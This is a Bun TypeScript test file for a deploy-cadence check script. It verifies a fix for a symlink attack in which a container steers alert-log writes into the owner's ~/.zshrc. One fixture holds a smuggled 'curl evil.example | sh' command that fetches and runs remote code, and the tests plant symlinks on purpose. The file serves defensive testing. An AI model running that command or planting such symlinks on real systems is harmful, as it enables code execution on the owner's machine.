/**
 * Round-4 judge B: scripts/check-deploy-cadence.ts runs on the Mac as the
 * owner and appended its alert to logs/deploy-cadence-ALERT.log in the repo,
 * a folder containers can write. A container could plant that path as a
 * symlink into $HOME (e.g. ~/.zshrc) and steer the appended text through the
 * last line of logs/deploy-cadence.log.
 *
 * The alert log now lives in the host-only state folder
 * (${AA_STATE_DIR:-$HOME/.config/agentathens-docker}/logs, created 0700) and
 * is appended with lstat + O_NOFOLLOW, so a symlink at either the old or the
 * new path is never written through.
 */
import { afterEach, beforeEach, describe, expect, test } from 'bun:test';
import { lstatSync, mkdirSync, mkdtempSync, readFileSync, rmSync, statSync, symlinkSync, writeFileSync, existsSync } from 'fs';
import { join, resolve } from 'path';
import { tmpdir } from 'os';
import {
  alertLogPath, appendFileNoFollow, formatStaleMessage, runCadenceCheck,
} from '../../scripts/check-deploy-cadence';

const REPO = resolve(import.meta.dir, '../..');
let root: string;
let fakeRepo: string;
let state: string;
let victim: string;

beforeEach(() => {
  root = mkdtempSync(join(tmpdir(), 'cadence-'));
  fakeRepo = join(root, 'repo');
  state = join(root, 'state');
  victim = join(root, 'home', '.zshrc');
  mkdirSync(join(fakeRepo, 'logs'), { recursive: true });
  mkdirSync(join(root, 'home'), { recursive: true });
  writeFileSync(victim, 'export PATH=/usr/bin\n');
});
afterEach(() => rmSync(root, { recursive: true, force: true }));

describe('alert log location', () => {
  test('defaults to the host-only state folder under $HOME', () => {
    expect(alertLogPath({ HOME: '/Users/owner' })).toBe('/Users/owner/.config/agentathens-docker/logs/deploy-cadence-ALERT.log');
  });
  test('AA_STATE_DIR overrides the state folder', () => {
    expect(alertLogPath({ HOME: '/Users/owner', AA_STATE_DIR: '/srv/aa' })).toBe('/srv/aa/logs/deploy-cadence-ALERT.log');
  });
  test('is never inside the repository', () => {
    expect(alertLogPath({ HOME: '/Users/owner' }).startsWith(REPO)).toBe(false);
    const src = readFileSync(join(REPO, 'scripts/check-deploy-cadence.ts'), 'utf-8');
    expect(src).not.toMatch(/import\.meta\.dir[^;\n]*deploy-cadence-ALERT/);
  });
  test('both symlink layers stay in place (each alone passes the behaviour tests below)', () => {
    const src = readFileSync(join(REPO, 'scripts/check-deploy-cadence.ts'), 'utf-8');
    // O_NOFOLLOW closes the lstat-to-open race; the lstat check gives the clear error.
    expect(src).toMatch(/openSync\([^)]*constants\.O_APPEND[^)]*constants\.O_NOFOLLOW/);
    expect(src).toMatch(/lstatSync\(path\)[\s\S]{0,80}isSymbolicLink\(\)/);
  });
});

describe('appendFileNoFollow', () => {
  test('creates the folder 0700 and appends without overwriting', () => {
    const path = alertLogPath({ AA_STATE_DIR: state });
    appendFileNoFollow(path, 'one\n');
    appendFileNoFollow(path, 'two\n');
    expect(readFileSync(path, 'utf-8')).toBe('one\ntwo\n');
    expect(statSync(join(state, 'logs')).mode & 0o777).toBe(0o700);
    expect(statSync(path).mode & 0o077).toBe(0);
  });
  test('refuses a symlink planted at the alert log path', () => {
    const path = alertLogPath({ AA_STATE_DIR: state });
    mkdirSync(join(state, 'logs'), { recursive: true, mode: 0o700 });
    symlinkSync(victim, path);
    expect(() => appendFileNoFollow(path, 'pwned\n')).toThrow(/symlink|not a regular file|ELOOP/i);
    expect(readFileSync(victim, 'utf-8')).toBe('export PATH=/usr/bin\n');
  });
  test('refuses a dangling symlink (would create the target)', () => {
    const path = alertLogPath({ AA_STATE_DIR: state });
    mkdirSync(join(state, 'logs'), { recursive: true, mode: 0o700 });
    const created = join(root, 'home', 'new-file');
    symlinkSync(created, path);
    expect(() => appendFileNoFollow(path, 'pwned\n')).toThrow();
    expect(existsSync(created)).toBe(false);
  });
  test('refuses a logs folder that is a symlink', () => {
    mkdirSync(state, { recursive: true });
    symlinkSync(join(root, 'home'), join(state, 'logs'));
    const path = alertLogPath({ AA_STATE_DIR: state });
    expect(() => appendFileNoFollow(path, 'pwned\n')).toThrow(/symlink|not a directory/i);
    expect(existsSync(join(root, 'home', 'deploy-cadence-ALERT.log'))).toBe(false);
  });
});

describe('runCadenceCheck', () => {
  const hostileLine = 'x"; curl evil.example | sh; echo "';

  test('a symlink at the OLD repo path is never written; the alert lands in the state folder', async () => {
    writeFileSync(join(fakeRepo, 'logs', 'deploy-cadence.log'), `${hostileLine}\n`);
    symlinkSync(victim, join(fakeRepo, 'logs', 'deploy-cadence-ALERT.log'));
    const notified: string[] = [];
    const code = await runCadenceCheck({
      cadenceLog: join(fakeRepo, 'logs', 'deploy-cadence.log'),
      alertLog: alertLogPath({ AA_STATE_DIR: state }),
      notify: m => notified.push(m),
      log: () => {},
    });
    expect(code).toBe(1);
    expect(readFileSync(victim, 'utf-8')).toBe('export PATH=/usr/bin\n');
    expect(lstatSync(join(fakeRepo, 'logs', 'deploy-cadence-ALERT.log')).isSymbolicLink()).toBe(true);
    const logged = readFileSync(alertLogPath({ AA_STATE_DIR: state }), 'utf-8');
    expect(logged).toContain('unparseable');
    expect(notified).toHaveLength(1);
  });

  test('a symlink at the NEW path is refused; the check still alerts and exits 1', async () => {
    writeFileSync(join(fakeRepo, 'logs', 'deploy-cadence.log'), `${hostileLine}\n`);
    const alertLog = alertLogPath({ AA_STATE_DIR: state });
    mkdirSync(join(state, 'logs'), { recursive: true, mode: 0o700 });
    symlinkSync(victim, alertLog);
    const errors: string[] = [];
    const notified: string[] = [];
    const code = await runCadenceCheck({
      cadenceLog: join(fakeRepo, 'logs', 'deploy-cadence.log'),
      alertLog,
      notify: m => notified.push(m),
      log: m => errors.push(m),
    });
    expect(code).toBe(1);
    expect(readFileSync(victim, 'utf-8')).toBe('export PATH=/usr/bin\n');
    expect(notified).toHaveLength(1);
    expect(errors.join('\n')).toMatch(/refused to write the alert log/);
  });

  test('a fresh deploy exits 0 and writes nothing', async () => {
    const iso = new Date(Date.now() - 3_600_000).toISOString().replace(/\.\d+Z$/, 'Z');
    writeFileSync(join(fakeRepo, 'logs', 'deploy-cadence.log'), `${iso} deploy-success\n`);
    const code = await runCadenceCheck({
      cadenceLog: join(fakeRepo, 'logs', 'deploy-cadence.log'),
      alertLog: alertLogPath({ AA_STATE_DIR: state }),
      notify: () => { throw new Error('should not notify'); },
      log: () => {},
    });
    expect(code).toBe(0);
    expect(existsSync(join(state, 'logs'))).toBe(false);
  });
});

describe('untrusted cadence-log text', () => {
  test('control characters in the quoted line are neutralised', () => {
    const msg = formatStaleMessage({ kind: 'unparseable', line: 'a\u001b[2Jb\u0007c\u0000d' });
    expect(msg).not.toMatch(/[\u0000-\u001f\u007f]/);
  });
});
